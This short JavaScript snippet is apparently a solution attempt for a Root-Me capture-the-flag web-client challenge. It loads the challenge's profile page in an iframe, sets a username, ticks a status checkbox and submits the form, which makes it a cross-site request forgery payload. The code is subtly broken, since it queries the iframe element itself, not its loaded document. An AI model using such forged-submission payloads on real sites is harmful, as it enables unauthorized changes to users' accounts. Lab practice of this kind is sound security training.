const ifr = document.querySelector("#principalIframe")
ifr.src = "http://challenge01.root-me.org/web-client/ch23/index.php?action=profile"

ifr.querySelector("#username").value = "test1"
ifr.querySelector("#status").checked = true

ifr.forms[0].submit()




